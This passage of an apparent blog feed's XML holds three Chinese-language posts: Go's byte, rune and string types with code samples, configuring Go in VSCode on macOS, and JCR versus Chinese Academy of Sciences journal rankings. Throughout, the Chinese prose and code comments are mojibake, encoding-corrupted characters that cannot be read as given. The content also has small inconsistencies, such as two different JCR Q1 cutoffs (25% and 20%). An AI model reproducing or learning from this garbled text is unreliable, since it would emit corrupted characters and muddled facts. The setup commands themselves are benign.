        <content type="html"><![CDATA[<h2 id="byte-å’Œ-rune">byte å’Œ rune</h2><p>byte æ˜¯ uint8 çš„åˆ«åï¼Œå…¶å­—é¢é‡æ˜¯ 8 ä½æ•´æ•°å€¼ï¼Œbyte åˆ‡ç‰‡ç›¸æ¯”äºä¸å¯å˜çš„stringæ–¹ä¾¿å¸¸ç”¨è®¸å¤šã€‚å®ƒå¯ä»¥æ›´æ”¹æ¯ä¸ªå­—èŠ‚æˆ–å­—ç¬¦ã€‚è¿™å¯¹äºå¤„ç†æ–‡ä»¶å†…å®¹(æ— è®ºæ˜¯æ–‡æœ¬æ–‡ä»¶ã€äºŒè¿›åˆ¶æ–‡ä»¶è¿˜æ˜¯æ¥è‡ªç½‘ç»œçš„I/O æµ)éå¸¸æœ‰æ•ˆã€‚byte åˆ‡ç‰‡æ˜¯ä¸€ä¸ªå¯å˜çš„å­—èŠ‚åºåˆ—</p><p>rune æ˜¯ int32 çš„åˆ«å,å…¶å­—é¢é‡æ˜¯ 32 ä½æ•´æ•°å€¼ï¼Œç”¨æ¥è¡¨ç¤º Unicodeå­—ç¬¦ç¼–ç ã€‚rune ç±»ä¼¼äº byteï¼Œä¸åŒç‚¹åœ¨äº runeæ¯ä¸ªç´¢å¼•æ˜¯ä¸€ä¸ªå­—ç¬¦è€Œä¸æ˜¯ä¸€ä¸ªå­—èŠ‚ã€‚runeåˆ‡ç‰‡æ˜¯å¯¹å­—èŠ‚ç‰‡çš„é‡æ–°åˆ†ç»„ä½¿å¾—æ¯ä¸ªç´¢å¼•éƒ½æ˜¯ä¸€ä¸ªå­—ç¬¦ã€‚</p><p>å¦‚æœä½ å¤„ç†çš„æ–‡æœ¬æ–‡ä»¶æœ‰å¾ˆå¤šé asciiå­—ç¬¦ï¼Œæ¯”å¦‚ä¸­æ–‡æ–‡æœ¬ã€æ•°å­¦å…¬å¼æˆ–å¸¦æœ‰è¡¨æƒ…ç¬¦å·çš„æ–‡æœ¬ï¼Œä½¿ç”¨ runeæ˜¯æœ€å¥½çš„ã€‚</p><p>rune ä¹Ÿæ˜¯ä»å­—ç¬¦ä¸²ä¸­è·å–å­å­—ç¬¦ä¸²çš„ç†æƒ³é€‰æ‹©ã€‚å®ƒæ”¯æŒ Unicodeå­—ç¬¦ï¼Œæ²¡æœ‰æ•°æ®æŸåçš„é£é™©ã€‚</p><p>å¯¹äº []runeï¼Œlen()å’Œç´¢å¼•éƒ½æ˜¯åŸºäº runeï¼ˆint32ï¼‰çš„ã€‚ å½“ä½ å°† []runeè½¬æ¢ä¸º string æ—¶ï¼Œæ¯ä¸ª rune æˆä¸ºå­—ç¬¦ä¸²ä¸­çš„ä¸€ä¸ª utf-8 å­—ç¬¦ã€‚</p><h2 id="byte-å’Œ-rune-çš„åŒºåˆ«">byte å’Œ rune çš„åŒºåˆ«</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">func main() &#123;</span><br><span class="line">s := &quot;GÃ–&quot;</span><br><span class="line">sample := &quot;Hå“ˆ&quot;</span><br><span class="line"></span><br><span class="line">sByte := []byte(s)</span><br><span class="line">sRune := []rune(s)</span><br><span class="line">sampleByte := []byte(sample)</span><br><span class="line">sampleRune := []rune(sample)</span><br><span class="line"></span><br><span class="line">fmt.Printf(&quot;%s\nsByte: %d\nsRune: %d\n&quot;, s, sByte, sRune)</span><br><span class="line">fmt.Println(&quot;------&quot;)</span><br><span class="line">fmt.Printf(&quot;%s\nsampleByte: %d\nsampleRune: %d\n&quot;, sample, sampleByte, sampleRune)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ° rune ä¸­é ASCII ç å­—ç¬¦çš„ Unicode ç¼–ç ä¸º 1-3 å­—èŠ‚ï¼Œä¸ ASCIIç å­—ç¬¦çš„å­—èŠ‚æ•°ä¸ä¸€å®šç›¸åŒã€‚</p><h2 id="string">string</h2><p>string æ˜¯ä¸å¯å˜çš„ byte åˆ‡ç‰‡ã€‚å› ä¸º Go ä¸­çš„æºä»£ç ä½¿ç”¨ utf-8ç¼–ç ï¼Œå› æ­¤æ¯ä¸ªå­—ç¬¦ä¸²ä¹Ÿä½¿ç”¨ utf-8 ç¼–ç ï¼Œå³ string å­—é¢é‡æ˜¯ utf-8 ç¼–ç ï¼Œä»¥byte ä¸ºå•ä½çš„ã€‚string ä¸­çš„æ¯ä¸ªå­—ç¬¦å®é™…å ç”¨ 1-3 ä¸ªå­—èŠ‚ï¼Œè€Œæ¯ä¸ª rune å  4ä¸ªå­—èŠ‚ã€‚</p><ul><li>ä½¿ç”¨ rune() å¯æŠŠ byte ä¸ºå•ä½çš„å­—ç¬¦è½¬æ¢ä¸º rune å­—ç¬¦ï¼Œå¯¹äº ASCIIå­—ç¬¦æ¥è¯´ï¼Œrune å€¼å’Œ byte å€¼ç›¸åŒï¼Œè€Œå¯¹äº Unicodeç¼–ç çš„å­—ç¬¦æ¥è¯´ä¾¿ä¸åŒäº†ã€‚</li><li>ä½¿ç”¨ []rune() å°† string è½¬æ¢ rune æ•°ç»„ã€‚å½“å°†å­—ç¬¦ä¸²è½¬æ¢ä¸º runeåˆ‡ç‰‡æ—¶ï¼Œå­—ç¬¦ä¸²ä¸­çš„æ¯ä¸ª utf-8 å­—ç¬¦è¢«è½¬æ¢ä¸ºä¸€ä¸ª runeï¼Œä»è€Œè·å¾—åŒ…å«å­—ç¬¦ä¸²Unicode ç¼–ç å­—ç¬¦çš„æ–°åˆ‡ç‰‡ã€‚</li><li>å¯¹äº stringï¼Œlen()å’Œç´¢å¼•éƒ½æ˜¯åŸºäº byteï¼ˆunint8ï¼‰çš„</li><li>åœ¨ Go ä¸­å°†å­—ç¬¦ä¸²è½¬æ¢ä¸º rune åˆ‡ç‰‡æ˜¯ä¸€ä¸ªæ ‡å‡†æ“ä½œï¼Œæ²¡æœ‰æ•°æ®æŸåçš„é£é™©ã€‚å­—ç¬¦ä¸²æ˜¯å¤„ç†çŸ­å­—èŠ‚æˆ–å­—ç¬¦åºåˆ—æ¯”è¾ƒå¥½çš„æ–¹æ³•ã€‚æ¯æ¬¡å¯¹å­—ç¬¦ä¸²è¿›è¡Œæ“ä½œ(ä¾‹å¦‚æŸ¥æ‰¾æ›¿æ¢å­—ç¬¦ä¸²æˆ–æ¥å—å­å­—ç¬¦ä¸²)æ—¶ï¼Œéƒ½ä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„å­—ç¬¦ä¸²ã€‚å¦‚æœå­—ç¬¦ä¸²éå¸¸å¤§ï¼Œä¾‹å¦‚æ–‡ä»¶å†…å®¹ï¼Œåˆ™æ•ˆç‡éå¸¸ä½ã€‚</li></ul><h3 id="string-ä¸­ç´¢å¼•å­—ç¬¦">string ä¸­ç´¢å¼•å­—ç¬¦</h3><p>ä¾‹å¦‚æˆ‘ä»¬å…ˆçœ‹ä¸‹é¢ç¨‹åºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">func main() &#123;</span><br><span class="line"></span><br><span class="line">sample := &quot;Helå“ˆ&quot;</span><br><span class="line">for i := 0; i &lt; len(sample); i++ &#123;</span><br><span class="line">fmt.Print(sample[i], &quot; &quot;)</span><br><span class="line">&#125;</span><br><span class="line">fmt.Println()</span><br><span class="line">fmt.Printf(&quot;%s\tçš„å­—èŠ‚é•¿åº¦: %d\n&quot;, sample, len(sample))</span><br><span class="line">fmt.Printf(&quot;å“ˆ\tå­—ç¬¦çš„å­—èŠ‚é•¿åº¦: %d\n&quot;, utf8.RuneLen(&#x27;å“ˆ&#x27;))</span><br><span class="line">fmt.Printf(&quot;%s\tçš„å­—ç¬¦é•¿åº¦: %d\n&quot;, sample, utf8.RuneCountInString(sample))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¾“å‡ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">72 101 108 229 147 136</span><br><span class="line">Helå“ˆ   çš„å­—èŠ‚é•¿åº¦: 6</span><br><span class="line">å“ˆ      å­—ç¬¦çš„å­—èŠ‚é•¿åº¦: 3</span><br><span class="line">Helå“ˆ   çš„å­—ç¬¦é•¿åº¦: 4</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹å‡ºå­—ç¬¦ä¸²çš„é•¿åº¦(len)å’Œå­—ç¬¦ä¸²çš„å­—ç¬¦é•¿åº¦ï¼ˆRuneCountInStringï¼‰æ˜¯ä¸åŒçš„ã€‚å› ä¸ºå­—ç¬¦ä¸²æ˜¯å­—èŠ‚åˆ‡ç‰‡ï¼ŒGoé»˜è®¤ UTF-8ï¼Œå­˜å‚¨é ASCII å­—ç¬¦æ—¶ï¼Œæ¯ä¸ªå­—ç¬¦åˆ™ä¼šå­˜å‚¨ 1-3ä¸ªå­—èŠ‚ã€‚æ‰€ä»¥æƒ³è¦æ­£ç¡®åœ°ç´¢å¼•å­—ç¬¦ä¸²ä¸­çš„å­—ç¬¦æœ‰ä»¥ä¸‹ä¸¤ç§æ–¹æ³•ï¼š</p><ol type="1"><li>å°†å­—ç¬¦ä¸²è½¬æ¢ä¸º rune åˆ‡ç‰‡</li><li>ä½¿ç”¨ range æ“ä½œç¬¦è¿­ä»£ Unicode å­—ç¬¦ ä¹Ÿå°±æ˜¯è¯´å¯¹å­—ç¬¦ä¸²è¿›è¡Œ rangè¿­ä»£ï¼Œæ˜¯å­—ç¬¦è¿­ä»£ï¼Œè€Œä¸æ˜¯å­—èŠ‚è¿­ä»£ã€‚</li></ol><h2 id="å…³äºç¼–ç çš„ä¸€äº›æ–¹æ³•">å…³äºç¼–ç çš„ä¸€äº›æ–¹æ³•</h2><p><code>utf8.ValidRune(chr)</code>ï¼š åˆ¤æ–­ chr æ˜¯å¦å¯ä»¥ç¼–ç ä¸ºåˆæ³•çš„utf-8 åºåˆ—ã€‚ <code>utf8.RuneLen(chr)</code>ï¼š æŸ¥çœ‹å­—ç¬¦ chr çš„å­—èŠ‚é•¿åº¦<code>utf8.RuneCount()</code>ï¼š æŸ¥çœ‹å­—èŠ‚æ•°ç»„ä¸­æŒ‰ç…§ rune å•ä½çš„å­—ç¬¦é•¿åº¦<code>utf8.RuneCountInString</code>ï¼š æŸ¥çœ‹å­—ç¬¦ä¸²æŒ‰ç…§ rune å•ä½çš„é•¿åº¦</p><h2 id="å‚è€ƒèµ„æ–™">å‚è€ƒèµ„æ–™</h2><blockquote><ol type="1"><li><ahref="https://appdividend.com/2020/03/12/golang-how-to-convert-string-to-rune-in-go-example/">Golang:How To Convert String To Rune in Go Example</a></li><li><ahref="https://stackoverflow.com/questions/19310700/what-is-a-rune">go -What is a rune? - Stack Overflow</a></li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> Golang </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>macOS VSCode é…ç½® Go ç¼–ç¨‹ç¯å¢ƒ</title>
      <link href="/blog/2022/10/16/programming/go/macos_golang/"/>
      <url>/blog/2022/10/16/programming/go/macos_golang/</url>
      
        <content type="html"><![CDATA[<p>ç¬”è€…ä½¿ç”¨ macOS BigSur å®‰è£…å®Œ Go 1.16.6 å’Œ VSCode Goæ’ä»¶ï¼Œç„¶åè¿è¡Œæ—¶ï¼Œå¾€å¾€ä¼šæŠ¥è¯¸å¦‚ä¸‹é¢çš„é”™è¯¯ï¼š</p><blockquote><p>build esc: cannot load xxx : malformed module path â€œxxxâ€: missing dotin first path element</p></blockquote><blockquote><p>warning: GOPATH set to GOROOT (/Users/xxx/go/) has no effect</p></blockquote><p>å®é™…ä¸Šï¼Œè¿™éƒ½æ˜¯ç”±äº GOPATH å’Œ GOROOTè¿™ä¸¤ä¸ªå…³é”®å‚æ•°é…ç½®é”™è¯¯é€ æˆçš„ã€‚è‡³äºè¿™ä¸¤ä¸ªå‚æ•°æ˜¯ä»€ä¹ˆå«ä¹‰ï¼Œå¯ä»¥çœ‹æˆ‘ä¹‹å‰çš„åšæ–‡ï¼šGOROOTã€GOPATHä»¥åŠ Go ç›¸å…³å‘½ä»¤ã€‚</p><p>ä¸‹é¢æˆ‘å°†ä» macOS å®‰è£… go å¼€å§‹æ¥è®²è§£é…ç½®æµç¨‹ï¼š</p><ol type="1"><li>é¦–å…ˆï¼Œæˆ‘ä»¬å»ºç«‹åœ¨ä½¿ç”¨ brew å®‰è£… go çš„å‰æä¸‹<code>brew install go</code></li><li>æŸ¥çœ‹ç¯å¢ƒå˜é‡ åœ¨ç»ˆç«¯è¾“å…¥ä»¥ä¸‹å‘½ä»¤æŸ¥çœ‹å¯¹åº”ç¯å¢ƒå˜é‡<code>go env GOPATH</code> æŸ¥çœ‹ GOPATH <code>go env GOROOT</code> æŸ¥çœ‹GOROOT ä¾‹å¦‚æˆ‘çš„ä¸¤ä¸ªï¼š <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ go env GOPATH</span><br><span class="line">/Users/realyee/go</span><br><span class="line">$ go env GOROOT</span><br><span class="line">/usr/local/Cellar/go/1.16.6/libexec</span><br></pre></td></tr></table></figure></li><li>åœ¨<code>~/.bash_profile</code>æˆ–è€…<code>~/.bashrc</code>ï¼ˆå¦‚æœä½ ä½¿ç”¨zshï¼Œåˆ™åœ¨<code>~/.zshrc</code>ï¼‰ä¸­åŠ å…¥å‘½ä»¤å¦‚ä¸‹,<strong>ä¸‹é¢çš„ GOPATH å’ŒGOROOT éƒ½ä»¥æˆ‘è‡ªå·±çš„ä¸ºä¾‹ï¼Œè¯·å¯¹åº”ä¿®æ”¹</strong>ï¼š <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">export GOPATH=/Users/realyee/go</span><br><span class="line">export GOROOT=/usr/local/Cellar/go/1.16.6/libexec</span><br><span class="line">export PATH=$PATH:$GOPATH/bin</span><br><span class="line">export PATH=$PATH:$GOROOT/bin</span><br></pre></td></tr></table></figure></li><li>åœ¨å½“å‰ shell ç”Ÿæ•ˆ<code>source ~/.bash_profile</code>æˆ–<code>source ~/.zshrc</code></li></ol><p>æ³¨æ„:åœ¨ macOS ä¸Šå®‰è£…å®Œ VSCode ä¹‹åï¼Œç»ˆç«¯é»˜è®¤æ²¡æœ‰é…ç½® codeå‘½ä»¤ï¼Œå¯ä»¥æ‰“å¼€ Command Paletteï¼ˆCmd+Shift+Pï¼‰ï¼Œè¾“å…¥ shell commandï¼Œå°†code å‘½ä»¤å®‰è£…åˆ°ç»ˆç«¯</p><h2 id="é…ç½®-vscode-è®¾ç½®">é…ç½® VSCode è®¾ç½®</h2><p>å¦‚æœä½ ç”¨ VSCode æ¥è¿›è¡Œ Go ç¼–ç¨‹ï¼Œå¹¶ä¸”å¸Œæœ›é€šè¿‡å®ƒè¿›è¡Œ Debugè°ƒè¯•ï¼Œå®‰è£…å¦‚ä¸‹æ’ä»¶ï¼š <ahref="https://marketplace.visualstudio.com/items?itemName=golang.Go">Go- Visual Studio Marketplace</a></p><p>æ‰“å¼€ VSCode çš„setting.jsonï¼ˆç›´æ¥å»ç›®å½•æ‰¾<code>~/Library/Application Support/Code/User/settings.json</code>ä¹Ÿå¯ï¼‰åŠ å…¥go ç›¸å…³é…ç½®ï¼š</p><p><strong>æ³¨æ„</strong>ï¼š</p><ol type="1"><li>å‰ä¸¤è¡Œä¸­çš„ GOPATH å’Œ GOROOT éƒ½ä»¥æˆ‘è‡ªå·±çš„ä¸ºä¾‹ï¼Œè¯·å¯¹åº”ä¿®æ”¹</li><li>æ³¨æ„ä¿®æ”¹ç¬¬ä¸‰è¡Œ HTTP ä»£ç†çš„ç«¯å£ï¼Œæ–¹ä¾¿ç¿»å¢™ä¸‹è½½ go å·¥å…·</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&quot;go.gopath&quot;: &quot;/Users/realyee/go&quot;,</span><br><span class="line">&quot;go.goroot&quot;: &quot;/usr/local/Cellar/go/1.16.6/libexec&quot;,</span><br><span class="line">&quot;http.proxy&quot;: &quot;http://127.0.0.1:7890&quot;,</span><br><span class="line">// Run Lint tool on save.</span><br><span class="line">&quot;go.lintOnSave&quot;: &quot;file&quot;, //åœ¨ä¿å­˜ä»£ç æ—¶è‡ªåŠ¨æ£€æŸ¥ä»£ç å¯ä»¥ä¼˜åŒ–çš„åœ°æ–¹ï¼Œå¹¶ç»™å‡ºå»ºè®®</span><br><span class="line">&quot;go.formatTool&quot;: &quot;gofmt&quot;, //ä½¿ç”¨ goimports å·¥å…·è¿›è¡Œä»£ç æ ¼å¼åŒ–ï¼Œæˆ–è€…ä½¿ç”¨ goreturns å’Œ gofmt</span><br><span class="line">&quot;go.docsTool&quot;: &quot;gogetdoc&quot;,</span><br><span class="line">&quot;go.autocompleteUnimportedPackages&quot;: true,</span><br><span class="line">// Specifies Lint tool name.</span><br><span class="line">&quot;go.lintTool&quot;: &quot;golint&quot;,</span><br><span class="line">// Flags to pass to Lint tool (e.g. [&quot;-min_confidence=.8&quot;])</span><br><span class="line">&quot;go.lintFlags&quot;: [],</span><br><span class="line">&quot;go.coverOnSave&quot;: false, //åœ¨ä¿å­˜ä»£ç æ—¶æ‰§è¡Œæµ‹è¯•ï¼Œå¹¶æ˜¾ç¤ºæµ‹è¯•è¦†ç›–ç‡</span><br><span class="line">&quot;go.useCodeSnippetsOnFunctionSuggest&quot;: true, //ä½¿ç”¨ä»£ç ç‰‡æ®µä½œä¸ºæç¤º</span><br><span class="line">&quot;go.gocodeAutoBuild&quot;: false, //ä»£ç è‡ªåŠ¨ç¼–è¯‘æ„å»º</span><br><span class="line">&quot;cSpell.enableFiletypes&quot;: [</span><br><span class="line">    &quot;go.mod&quot;,</span><br><span class="line">    &quot;go.sum&quot;</span><br><span class="line">],</span><br><span class="line">&quot;[go]&quot;: &#123;</span><br><span class="line">    &quot;editor.insertSpaces&quot;: false,</span><br><span class="line">    &quot;editor.formatOnSave&quot;: true,</span><br><span class="line">    &quot;editor.codeActionsOnSave&quot;: &#123;</span><br><span class="line">        &quot;source.organizeImports&quot;: true</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;editor.suggest.snippetsPreventQuickSuggestions&quot;: false</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åæ‰“å¼€ Command Paletteï¼ˆCmd+Shift+Pï¼‰ï¼Œè¾“å…¥ go:installï¼Œç‚¹å‡»é€‰æ‹©Go:Install/Update Toolsï¼Œå…¨é€‰æ‰€æœ‰å·¥å…·è¿›è¡Œå®‰è£…ã€‚æœ€ååœ¨é¡¹ç›®ç›®å½•çš„ .vscodeç›®å½•çš„ launch.json ä¸­æ·»åŠ å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">&quot;name&quot;: &quot;Launch Package&quot;,</span><br><span class="line">&quot;type&quot;: &quot;go&quot;,</span><br><span class="line">&quot;request&quot;: &quot;launch&quot;,</span><br><span class="line">&quot;mode&quot;: &quot;debug&quot;,</span><br><span class="line">&quot;program&quot;: &quot;$&#123;workspaceFolder&#125;&quot;,</span><br><span class="line">&quot;args&quot;:[&quot;serve&quot;]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸‹é¢å°±å¯ä»¥åœ¨ Debug é¡µé¢æ‰¾åˆ° Launch Package é€‰é¡¹å¿«ä¹åœ° debug goäº†ã€‚</p><h2 id="å‚è€ƒæ–‡ç« ">å‚è€ƒæ–‡ç« </h2><ol type="1"><li><ahref="https://code.visualstudio.com/docs/setup/mac#_launching-from-the-command-line">RunningVisual Studio Code on macOS</a></li><li><ahref="https://blog.csdn.net/u010953692/article/details/103192550">VisualStudio Code for mac è®¾ç½®ä»£ç† å®‰è£… go å¼€å‘ç¯å¢ƒ_mixboot-CSDN åšå®¢</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> Golang </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vscode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SCIï¼ŒJCR åˆ†åŒºä¸ä¸­ç§‘é™¢åˆ†åŒº</title>
      <link href="/blog/2022/10/16/academic/sci_jcr/"/>
      <url>/blog/2022/10/16/academic/sci_jcr/</url>
      
        <content type="html"><![CDATA[<h2 id="jcr-åˆ†åŒºä¸ä¸­ç§‘é™¢åˆ†åŒº">JCR åˆ†åŒºä¸ä¸­ç§‘é™¢åˆ†åŒº</h2><p>JCRï¼ˆJournal Citation Reportsï¼‰åˆ†åŒºæ˜¯å›½é™…ç»Ÿä¸€åˆ†åŒºï¼Œä¹Ÿå°±æ˜¯ SCIåˆ†åŒºï¼›ä¸­ç§‘é™¢åˆ†åŒºæ˜¯æˆ‘å›½ç‰¹è‰²åˆ†åŒºï¼Œé™¤äº†ä¸­å›½æ²¡äººè®¤ä¸­ç§‘é™¢åˆ†åŒºã€‚</p><p>å®é™…ä¸Šï¼Œå›½å†…å¤§éƒ¨åˆ†çš„é«˜æ ¡æ¯•ä¸šè¦æ±‚ã€å¥–å­¦é‡‘è¯„é€‰ï¼Œä»¥åŠç§‘ç ”å•ä½çš„ç§‘ç ”ä¸šç»©å¥–åŠ±ã€èŒç§°è¯„å®¡ç­‰ï¼Œå‡æŒ‰ç…§ä¸­ç§‘é™¢åˆ†åŒºè¿›è¡ŒåŠ æƒè®¡ç®—ã€‚å½“ç„¶ï¼Œä¹Ÿæœ‰äº›å­¦æ ¡ï¼ˆå¦‚åå—ç†å·¥å¤§å­¦ï¼‰è¡¨ç¤ºè¦ä¸å›½é™…æ¥è½¨ï¼Œç»Ÿä¸€ä½¿ç”¨ç§‘ç¿å”¯å®‰JCRåˆ†åŒºä½œä¸ºå­¦ç§‘å»ºè®¾ã€ç§‘æŠ€å¥–åŠ±ã€æˆäºˆå­¦ä½æˆæœç­‰æ–¹é¢çš„è¯„åˆ¤æ ‡å‡†ï¼Œä¸å†ä½¿ç”¨ä¸­ç§‘é™¢çš„SCI æœŸåˆŠåˆ†åŒºæ ‡å‡†ã€‚å¤§é™†ä¹‹å¤–ä¸€èˆ¬é‡‡ç”¨ JCR åˆ†åŒºã€‚</p><p>ä½œè€…å‘è¡¨ SCI è®ºæ–‡æ—¶ï¼Œç»å¸¸ä¼šé‡åˆ°åˆ†åŒºçš„é™å®šæ¡ä»¶ï¼Œæ¯”å¦‚ä¸­ç§‘é™¢ 1 åŒºï¼ŒJCRQ1ç­‰ã€‚è™½ç„¶ä¸¤ä¸ªåˆ†åŒºéƒ½æœ‰å¯èƒ½å‡ºç°ï¼Œä½†å¤§å¤šæ•°æ—¶å€™ï¼Œå›½å†…ä½œè€…è¿˜æ˜¯ä»¥ä¸­ç§‘é™¢åˆ†åŒºä¸ºå‡†ï¼Œå¦‚æœæ²¡æœ‰ç‰¹åˆ«è¦æ±‚ä»¥ä¸­ç§‘é™¢åˆ†åŒºå°ç±»ä¸ºå‡†ï¼Œæˆ‘ä»¬å°±é»˜è®¤ä»¥ä¸­ç§‘é™¢åˆ†åŒºå¤§ç±»æ ‡å‡†ä¸ºä¸»ã€‚</p><p>JCRæ˜¯å›½é™…ä¸Šé€šç”¨çš„ä¸€å¥—ï¼Œä½†æ˜¯å›½å†…ç§‘ç ”ç«äº‰å¤ªæ¿€çƒˆï¼Œä¸­ç§‘é™¢å°±æäº†ä¸ªä¸­å›½ç‰¹è‰²çš„åˆ†åŒºä½“ç³»ã€‚ä¸¤è€…éƒ½æ˜¯å…ˆæŠŠæ‚å¿—çš„IF ä»é«˜åˆ°ä½æ’åº</p><p>JCR æ˜¯å‰ 25% ä¸€åŒºï¼Œåé¢äºŒåŒºåˆ°å››åŒºå„å  25%ï¼›ä¸­ç§‘é™¢æ˜¯å‰ 5%ä¸€åŒºï¼Œ5%~20%äºŒåŒºï¼Œ20%~50% ä¸‰åŒºï¼Œ50%~æœ€åå››åŒºã€‚åè€…æ¯”å‰è€…ä¸¥æ ¼å¤ªå¤šï¼Œæœ‰äº› JCRçš„ä¸€åŒºæ‚å¿—åœ¨ä¸­ç§‘é™¢è¿™è¾¹åªèƒ½æ’åˆ°ä¸‰åŒº</p><p>è™½ç„¶å¾ˆå¤šäººå¯èƒ½ä¸é‚£ä¹ˆèµåŒï¼Œä½†æ¥è‡ªä¸­å›½çš„å·¥ä½œï¼Œåœ¨å…¨ä¸–ç•Œæ¥çœ‹æ˜¯å¤„äºé«˜äºå¹³å‡çš„æ°´å‡†çš„ã€‚æ‰€ä»¥ï¼Œä¾é JCRåˆ†åŒºæ¥è¯„ä»·å·¥ä½œçš„ç­‰çº§åœ¨ä¸­å›½ä¸å¤§åˆé€‚ï¼Œè¦æ±‚æ˜¾å¾—æ¯”è¾ƒä½äº†ã€‚æ‰€ä»¥å›½å†…ä¸­ç§‘é™¢å‚è€ƒJCRè¿›ä¸€æ­¥å‡ºäº†ä¸€ä¸ªä¸­ç§‘é™¢çš„æœŸåˆŠåˆ†åŒºï¼Œç”¨æ¥æŒ‡å¯¼å›½å†…çš„ç§‘ç ”æˆæœè¯„ä»·ã€‚æ€»ä½“æ¥çœ‹ï¼Œæ— è®ºæ˜¯å¤§é¢†åŸŸè¿˜æ˜¯å°é¢†åŸŸï¼Œä¸­ç§‘é™¢çš„åˆ†åŒºè¦æ±‚éƒ½æ˜¯æ¯”JCR è¦é«˜çš„ã€‚å¾ˆå¤š JCRQ1çš„æœŸåˆŠï¼Œåœ¨ç›¸åŒé¢†åŸŸé‡Œï¼Œåœ¨ä¸­ç§‘é™¢çš„åˆ†åŒºå°±å˜æˆäº†äºŒåŒºç”šè‡³ä¸‰åŒºçš„æœŸåˆŠã€‚</p><p>å½±å“å› å­é«˜ä½å¹¶ä¸èƒ½å•çº¯åæ˜ ä¸€ä¸ªå­¦ç§‘é¢†åŸŸçš„çœŸå®æ°´å¹³ï¼Œæœ¬ä¸“ä¸šçš„é¡¶çº§æœŸåˆŠåŒè¡Œéƒ½è‡ªå·±éå¸¸æ¸…æ¥šã€‚JCRå’Œ SCI åˆ†åŒºéƒ½æ˜¯äººæçš„ï¼Œå°±ä¼šæœ‰éç†æ€§çš„åå‘ã€‚</p><h2 id="åˆ†åŒºå†™æ³•">åˆ†åŒºå†™æ³•</h2><p>ä¸­ç§‘é™¢åˆ†åŒºå’Œ JCRåˆ†åŒºï¼Œè™½ç„¶éƒ½æ˜¯å››ä¸ªåˆ†åŒºï¼Œä½†ä¸¤ä¸ªåˆ†åŒºçš„å†™æ³•æ˜¯ä¸åŒçš„ã€‚ä¸­ç§‘é™¢åˆ†åŒºåˆ†åˆ«æ˜¯ 1åŒºã€2 åŒºã€3 åŒºã€4 åŒºã€‚JCR,SCI åˆ†åŒºåˆ†åˆ«æ˜¯ Q1ã€Q2ã€Q3ã€Q4ã€‚</p><h2 id="æŸ¥æ‰¾æœŸåˆŠçš„åˆ†åŒºä¸å½±å“å› å­">æŸ¥æ‰¾æœŸåˆŠçš„åˆ†åŒºä¸å½±å“å› å­</h2><ol type="1"><li><p>Web of Science ä¸ŠæŸ¥æ‰¾æœŸåˆŠçš„åå­—ï¼Œå¯ä»¥æ˜¾ç¤ºå‡ºæœŸåˆŠçš„ JCRä¸å½±å“å› å­</p><p>SCI æŒ‡å®šçš„ JCR åˆ†åŒºé—¨æ§›ä½ï¼ŒæŒ‰ç…§æœ€æ–°å› å­ï¼Œå¦‚å‰ 20% å°±æ˜¯ä¸€åŒºäº†ä¸­ç§‘é™¢çš„åˆ†åŒºé—¨æ§›é«˜ï¼Œä¸‰å¹´å¹³å‡å› å­ï¼Œå‰ 5%æ‰æ˜¯ä¸€åŒº</p></li><li><p>IEEEï¼ŒACM åœ¨æœŸåˆŠä¸»é¡µä¹Ÿä¼šè¯¥æœŸåˆŠçš„å½±å“å› å­</p></li><li><p>Letpub ä¸Šä¹Ÿå¯æŸ¥åˆ°å½±å“å› å­ä¸åˆ†åŒº</p></li></ol><h2 